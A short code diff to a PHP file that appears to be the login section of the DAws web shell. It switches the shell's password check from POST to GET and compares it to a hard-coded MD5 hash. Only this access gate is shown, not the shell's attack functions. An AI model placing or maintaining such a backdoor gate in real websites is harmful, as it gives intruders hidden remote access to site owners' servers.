@@ -362,8 +362,8 @@ function installed_php($function=null, $class=null) { //checks if a function/cla
 if (!isset($_SESSION["logged_in"])) {
 	$show_it = True;
 	
-	if (isset($_POST["pass"])) {
-		if(md5($_POST["pass"]) == "e907a6ddeda3124903af2ff3d5e94ed4") { //DAws
+	if (isset($_GET["pass"])) {
+		if(md5($_GET["pass"]) == "e907a6ddeda3124903af2ff3d5e94ed4") { //DAws
 			$_SESSION["logged_in"] = True;
 		} else {
 			session_destroy();
